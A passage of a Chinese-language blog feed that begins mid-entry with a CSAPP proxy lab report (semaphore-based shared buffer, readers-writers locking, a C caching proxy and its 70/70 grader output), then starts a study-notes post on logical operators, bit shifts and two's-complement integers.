class="line"></span><br><span class="line"><span class="comment">/* Insert item onto the rear of shared buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    P(&amp;sp-&gt;slots);                          <span class="comment">/* Wait for available slot */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item; <span class="comment">/* Insert the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;items);                          <span class="comment">/* Announce available item */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove and return the first item from buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);                           <span class="comment">/* Wait for available item */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                           <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)]; <span class="comment">/* Remove the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                           <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;slots);                           <span class="comment">/* Announce available slot */</span></span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>Java</code> 中的阻塞队列，也是类似的实现逻辑。区别在于，只使用了一个可重入锁，搭配两个条件变量 <code>notempty,
notfull</code> 标识队列是否非满与非空。</p>
<h2 id="part-3">Part 3</h2>
<p>实现缓存功能，缓存客户端请求的资源，减少与服务端交互。在服务端并行的设置下，<code>cache</code> 的读写显然必须有锁保护。然而，一把大锁会使得所有请求变为串行执行，是不可行的，可以从两个角度改进：</p>
<ul>
<li>分段锁。划分多个 <code>cache</code>，根据 hash 路由，每次读写只在段内加锁，jdk
1.7 之前的 <code>ConcurrentHashMap</code> 就是这种思想。</li>
<li>优先读。考虑到 <code>cache</code> 的读多于写，而读取时可以不需要加锁，写入时才需要加锁。因此，可以优先保证读取，来提高性能。可以通过读者写者问题的解决方法实现。</li>
</ul>
<p>读者写者问题（Readers-Writes
Problem）是互斥问题的通用描述，，具体为：</p>
<ul>
<li>读者线程只读取对象</li>
<li>写者线程修改对象</li>
<li>写者对于对象的访问是互斥的</li>
<li>多个读者可以同时读取对象</li>
</ul>
<p>常见的应用场景是：</p>
<ul>
<li>在线订票系统：所有顾客都在查看座位，正在订票的顾客必须对数据库有互斥访问权限。</li>
<li>多线程缓存 web
代理：多个线程可以读取缓存，但要写入的线程必须有互斥访问权限。</li>
</ul>
<p>根据不同的读写策略，可以分为两类读者写者问题，需要注意的是，这两种情况都可能出现
starvation（饥饿）。</p>
<blockquote>
<p>第一类读者写者问题（读者优先）</p>
</blockquote>
<ul>
<li>如果写者没有获取到使用对象的权限，不应该让读者等待</li>
<li>在等待的写者之后到来的读者应该在写者之前处理</li>
<li>也就是说，只有没有读者的情况下，写者才能工作</li>
</ul>
<blockquote>
<p>第二类读者写者问题（写者优先）</p>
</blockquote>
<ul>
<li>一旦写者可以处理的时候，就不应该进行等待</li>
<li>在等待的写者之后到来的读者应该在写者之后处理</li>
</ul>
<p>读者优先的代码如下。第一个读者到来时，获取写锁 <code>P(w)</code> 来阻塞后续写入，最后一个读取完毕的读者释放写锁 <code>V(w)</code> 允许后续写入。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">int</span> readcnt;    <span class="comment">/* Initially = 0 */</span></span><br><span class="line"><span class="keyword">sem_t</span> mutex, w; <span class="comment">/* Both initially = 1 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt++;</span><br><span class="line">        <span class="keyword">if</span> (readcnt == <span class="number">1</span>) <span class="comment">/* First in */</span></span><br><span class="line">            P(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">        <span class="comment">/* Critical section */</span></span><br><span class="line">        <span class="comment">/* Reading happens */</span></span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt--;</span><br><span class="line">        <span class="keyword">if</span> (readcnt == <span class="number">0</span>) <span class="comment">/* Last out */</span></span><br><span class="line">            V(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(&amp;w);</span><br><span class="line">        <span class="comment">/* Critical section */</span></span><br><span class="line">        <span class="comment">/* Writing happens */</span></span><br><span class="line">        V(&amp;w);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="代码与结果">代码与结果</h2>
<p><code>cache</code> 部分我复用了之前 <code>cachelab</code> 的代码，修改成了分段锁的版本。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sbuf.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cache.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_porturi</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *dest, <span class="keyword">char</span> **uri)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_once</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTHREADS 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBUFSIZE 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_CACHE_SETS 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *(kept_headers[<span class="number">5</span>]) = {<span class="string">"Host"</span>, <span class="string">"User-Agent"</span>, <span class="string">"Connection"</span>, <span class="string">"Proxy-Connection"</span>, <span class="literal">NULL</span>};</span><br><span class="line"><span class="keyword">sbuf_t</span> sbuf; <span class="comment">/* Shared buffer of connected descriptors */</span></span><br><span class="line"><span class="keyword">static</span> Cache *cache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, user_agent_hdr);</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check command line args */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="comment">// 初始化阻塞队列</span></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="comment">// 屏蔽SIGPIPE信号</span></span><br><span class="line">    Signal(SIGPIPE, SIG_IGN);</span><br><span class="line">    cache = newCache(N_CACHE_SETS, MAX_CACHE_SIZE, MAX_OBJECT_SIZE);</span><br><span class="line">    <span class="comment">// 线程池</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">    {</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE,</span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Accepted connection from (%s, %s) at fd %d\n"</span>, hostname, port, connfd);</span><br><span class="line">        <span class="comment">// int *vargp = malloc(sizeof(int));</span></span><br><span class="line">        <span class="comment">// *vargp = connfd;</span></span><br><span class="line">        <span class="comment">// Pthread_create(&amp;tid, NULL, thread_once, vargp);</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> client_fd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> server_fd;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], url[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> client_rio, server_rio;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    Rio_readinitb(&amp;client_rio, client_fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;client_rio, buf, MAXLINE)) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 读取请求行</span></span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">"%s %s %s"</span>, method, url, version); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> server_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> *uri = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// 解析uri与端口</span></span><br><span class="line">    parse_porturi(url, server_port, &amp;uri);</span><br><span class="line">    CacheVisit visit;</span><br><span class="line">    visit.key = uri;</span><br><span class="line">    CacheData *cacheData = fetch(cache, &amp;visit);</span><br><span class="line">    <span class="comment">// cache命中</span></span><br><span class="line">    <span class="keyword">if</span> (cacheData != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uri %s hit cache, address %p, size %d\n"</span>, uri, cacheData-&gt;data, cacheData-&gt;size);</span><br><span class="line">        Rio_writen(client_fd, cacheData-&gt;data, cacheData-&gt;size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uri %s miss cache\n"</span>, uri);</span><br><span class="line">    <span class="comment">// 与服务端建立连接</span></span><br><span class="line">    server_fd = Open_clientfd(<span class="string">"localhost"</span>, server_port);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"GET %s HTTP/1.0\r\n"</span>, uri);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="comment">// 设置代理header</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Host: www.cmu.edu\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"User-Agent: %s\r\n"</span>, user_agent_hdr);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Connection: close\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Proxy-Connection: close\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转发其他header</span></span><br><span class="line">    <span class="keyword">char</span> key_buf[MAXLINE], value_buf[MAXLINE];</span><br><span class="line">    Rio_readlineb(&amp;client_rio, buf, MAXLINE);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">"\r\n"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sscanf</span>(buf, <span class="string">"%s: %s"</span>, key_buf, value_buf);</span><br><span class="line">        <span class="keyword">int</span> skip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; kept_headers[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span> (strcasecmp(key_buf, kept_headers[i]) == <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                skip = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (!skip)</span><br><span class="line">        {</span><br><span class="line">            Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">        }</span><br><span class="line">        Rio_readlineb(&amp;client_rio, buf, MAXLINE);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 缓存结果</span></span><br><span class="line">    <span class="keyword">char</span> *data = <span class="built_in">malloc</span>(MAX_OBJECT_SIZE);</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">    Rio_readinitb(&amp;server_rio, server_fd);</span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readnb(&amp;server_rio, buf, MAXLINE)) &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (size + n &lt; MAX_OBJECT_SIZE)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">memcpy</span>(data + size, buf, n);</span><br><span class="line">            size += n;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            size = MAX_OBJECT_SIZE + <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        Rio_writen(client_fd, buf, n);</span><br><span class="line">    }</span><br><span class="line">    cacheData = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheData));</span><br><span class="line">    cacheData-&gt;data = data;</span><br><span class="line">    cacheData-&gt;size = size;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= MAX_OBJECT_SIZE)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uri %s is stored into cache\n"</span>, uri);</span><br><span class="line">        store(cache, uri, cacheData);</span><br><span class="line">    }</span><br><span class="line">    Close(server_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_porturi</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *dest, <span class="keyword">char</span> **uri)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// 默认端口号</span></span><br><span class="line">    <span class="keyword">char</span> *default_port = <span class="string">"80"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在URL中查找协议部分的冒号</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *protocol_end = <span class="built_in">strstr</span>(url, <span class="string">"://"</span>);</span><br><span class="line">    <span class="keyword">if</span> (protocol_end != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 找到协议部分的冒号</span></span><br><span class="line">        protocol_end += <span class="number">3</span>; <span class="comment">// 移动到协议部分的末尾</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *port_start = <span class="built_in">strchr</span>(protocol_end, <span class="string">':'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (port_start != <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">// 找到冒号，表示有端口号</span></span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(port_start + <span class="number">1</span>, <span class="string">"%d"</span>, &amp;port) == <span class="number">1</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">sprintf</span>(dest, <span class="string">"%d"</span>, port);</span><br><span class="line">                *uri = <span class="built_in">strchr</span>(protocol_end, <span class="string">'/'</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    *uri = <span class="built_in">strchr</span>(protocol_end, <span class="string">'/'</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(dest, <span class="string">"%s"</span>, default_port);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_once</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> connfd = *(<span class="keyword">int</span> *)vargp;</span><br><span class="line">    doit(connfd); <span class="comment">/* Service client */</span></span><br><span class="line">    Close(connfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf); <span class="comment">/* Remove connfd from buffer */</span></span><br><span class="line">        doit(connfd);                    <span class="comment">/* Service client */</span></span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">*** Basic ***</span><br><span class="line">Starting tiny on 15325</span><br><span class="line">Starting proxy on 20457</span><br><span class="line">1: home.html</span><br><span class="line">   Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/home.html into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">2: csapp.c</span><br><span class="line">   Fetching ./tiny/csapp.c into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/csapp.c into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">3: tiny.c</span><br><span class="line">   Fetching ./tiny/tiny.c into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/tiny.c into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">4: godzilla.jpg</span><br><span class="line">   Fetching ./tiny/godzilla.jpg into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/godzilla.jpg into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">5: tiny</span><br><span class="line">   Fetching ./tiny/tiny into ./.proxy using the proxy</span><br><span class="line">   Fetching ./tiny/tiny into ./.noproxy directly from Tiny</span><br><span class="line">   Comparing the two files</span><br><span class="line">   Success: Files are identical.</span><br><span class="line">Killing tiny and proxy</span><br><span class="line">basicScore: 40/40</span><br><span class="line"></span><br><span class="line">*** Concurrency ***</span><br><span class="line">Starting tiny on port 12414</span><br><span class="line">Starting proxy on port 22796</span><br><span class="line">Starting the blocking NOP server on port 32913</span><br><span class="line">Trying to fetch a file from the blocking nop-server</span><br><span class="line">Fetching ./tiny/home.html into ./.noproxy directly from Tiny</span><br><span class="line">Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">Checking whether the proxy fetch succeeded</span><br><span class="line">Success: Was able to fetch tiny/home.html from the proxy.</span><br><span class="line">Killing tiny, proxy, and nop-server</span><br><span class="line">concurrencyScore: 15/15</span><br><span class="line"></span><br><span class="line">*** Cache ***</span><br><span class="line">Starting tiny on port 23752</span><br><span class="line">Starting proxy on port 26743</span><br><span class="line">Fetching ./tiny/tiny.c into ./.proxy using the proxy</span><br><span class="line">Fetching ./tiny/home.html into ./.proxy using the proxy</span><br><span class="line">Fetching ./tiny/csapp.c into ./.proxy using the proxy</span><br><span class="line">Killing tiny</span><br><span class="line">Fetching a cached copy of ./tiny/home.html into ./.noproxy</span><br><span class="line">Success: Was able to fetch tiny/home.html from the cache.</span><br><span class="line">Killing proxy</span><br><span class="line">cacheScore: 15/15</span><br><span class="line"></span><br><span class="line">totalScore: 70/70</span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>完结撒花！终于在 2023 年完成了 CSAPP 这门课的学习！在这门课的学习与实践里，收获还是非常多的。一方面复习了本科学习的专业知识，还从教授的旁征博引中领悟了新的理解；另一方面，在这么多课程学完之后，对计算机系统的认识也有了更清晰的轮廓，有一种计算机大厦落地简称的感觉。细分方向的专业课是计算机系统里小而独立的模块，像计算机组成、操作系统、编译原理等，CSAPP 可以把相关的知识串起来，以程序员的角度，建立起对计算机系统的顶层认识。这也是我觉得这门课的魅力所在。</p>
<p>祝看到这篇博客的朋友们，新年快乐，万事顺意！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://wdxtub.com/csapp/thin-csapp-9/2016/04/16/">【读薄
CSAPP】玖 并行与同步 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP - 学习笔记 (1): 字节与整数</title>
    <url>/blog/2023/04/28/CSAPP-Notes-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近开了个新坑，打算学习一下 CSAPP 和 Mit
S6.081，会把一些学习笔记和实验报告更新在博客上。CSAPP（Computer
Systems：A Programmer’s
Perspective），即从程序员的角度学习计算机系统，是 CMU 的一门名课，配套同名黑书教材，译为《深入了解计算机系统》。</p>
<p>这一节是 CSAPP 的第一节，包含了整数表示、操作等。</p>
<span id="more"></span>
<p>下面是一些有用的链接，供想学习的同学参考：</p>
<ul>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-s081/">简介
- MIT6.S081 (gitbook.io)</a></li>
<li><a href="https://csdiy.wiki/体系结构/CSAPP/">CMU 15-213: CSAPP -
CS 自学指南 (csdiy.wiki)</a></li>
</ul>
<h2 id="逻辑运算">逻辑运算</h2>
<p>逻辑运算：&amp;&amp;, ||, ! 特点：</p>
<ul>
<li>0 被认为是 false</li>
<li> 非 0 值被认为是 true</li>
<li> 总是返回 true 或 false</li>
<li> 短路求值
<ul>
<li>短路求值一种友好的特性，它的优点是：</li>
</ul></li>
<li>可以用于前置判断，避免非法操作
<ul>
<li>例如，<code>p&amp;&amp;*p</code>，会先判断指针 p
地址合法，再去访问，避免错误</li>
</ul></li>
<li>可以减少无用操作
<ul>
<li>例如，<code>1||func()</code> 永远返回 true，无需调用
<code>func</code> 函数，可以提高效率 当然，短路求值也有一定的缺点</li>
</ul></li>
<li>基于跳转法实现的，短路求值需要增加很多跳转指令，会把代码块拆分为更小的基本块，给优化带来挑战
<ul>
<li>短路求值的关键是：若结果已确定则直接跳出，否则继续计算结果。需要在每次求解后插入跳转指令。</li>
<li>编译优化算法一般以跳转 / 分支拆分得到的基本块为单位，进行块内和块间优化，基本块越小、数量越多，越不利于优化
如果逻辑操作无副作用，那么可以直接使用算术法，相当于不严格按照短路求值实现，但由于无副作用，所以结果是相同的。</li>
</ul></li>
</ul>
<p>可参考 <a href="https://www.zhihu.com/question/53273670">逻辑表达式的短路是如何实现的？
- 知乎 (zhihu.com)</a></p>
<h2 id="移位">移位</h2>
<h3 id="左移-xy">左移: x&lt;&lt;y</h3>
<p>左移总是相同的，例如二进制串 "011000010" 左移 3
位后得到 "00010000"，低位用 0
补充，溢出的高位消失不见，规则同时适用于正负数。</p>
<h3 id="右移-xy">右移: x&gt;&gt;y</h3>
<p>右边的多余低位被丢弃，左侧的填充规则有两种：</p>
<ul>
<li>逻辑右移：使用 0 填充高位</li>
<li>算数右移：使用符号位填充高位 例如串 "10100010"，右移 3
位的结果分别是：</li>
<li>逻辑右移：00101000</li>
<li> 算数右移：11101000 在
C/C++ 语言中，右移均使用 "&gt;&gt;" 操作符，编译器对有符号数进行算数右移，对无符号数进行逻辑右移
在 Java
中，算数右移对应 "&gt;&gt;" 操作符，逻辑右移使用 “&gt;&gt;&gt;”。而且 Java
中只存在有符号数。</li>
</ul>
<h3 id="未定义行为">未定义行为</h3>
<p>如果把一个 8 位的数 x，左移 8 位，会发生什么？</p>
<ul>
<li>直觉来看应该是 0</li>
<li> 在大多数机器上，会得到 x
本身，因为移位的长度会对数长取模，8%8=0，即左移 0 位</li>
<li>这是一种未定义行为，不应该依赖它的结果</li>
</ul>
<h2 id="整数表示">整数表示</h2>
<h3 id="无符号数">无符号数</h3>
<p>对于 w 位的无符号整数，最小值为 0，最大值为<span class="math inline"> \(2^w-1\)</span>，所有位都被解释为正数权重，从高到底依次为<span class="math inline"> \(2^{w-1},2^{w-2},...,2^0\)</span>，数字的值为 <span class="math display">\[
B2U(X)=sum_{i=0}^{w-1}x_i\cdot 2^i
\]</span> <span class="math inline">\(B2U(X)\)</span> 表示将比特串 X
转换为无符号数的数值。</p>
<h3 id="有符号数">有符号数</h3>
<p>几乎所有的现代机器都使用补码表示。</p>
<h4 id="补码">补码</h4>
<p>补码（Two's Complement），使用最高位作为符号位，权重为<span class="math inline"> \(-2^{w-1}\)</span>，剩余位与无符号数的权重相同。
<span class="math display">\[
B2T(X)=-x_{w-1}\cdot 2^{w-1}+sum_{i=0}^{w-2}x_i\cdot 2^i
\]</span> 在补码场景下，负数最小值的表示为<span class="math inline"> \(T_{min}=10\cdots
0\)</span>，即只有负权重，负数最大值（-1）的表示为<span class="math inline"> \(11\cdots 1\)</span>，即全部为 1，正数最大值为<span class="math inline"> \(T_{max}=01\cdots 1\)</span>。 w
位补码的表示范围为<span class="math inline"> \(-2^{w-1} \sim
2^{w-1}-1\)</span>，正数比负数少一个，这可能会导致各种边界错误。
补码标识下，正负数的转换，可以通过 <strong>取反 + 1</strong> 得到，例如 4
位数下，2 的表示为 "0010"，按位取反得到 "1101"，再 + 1
得到 “1110”，这就是 - 2.</p>
<ul>
<li>这是由于负数数量比正数多 1 个。</li>
<li><span class="math inline">\(T_{min}\)</span> 的相反数还是<span class="math inline"> \(T_{min}\)</span></li>
</ul>
<p>除了补码，还有两种标准表示方法：</p>
<h4 id="反码">反码</h4>
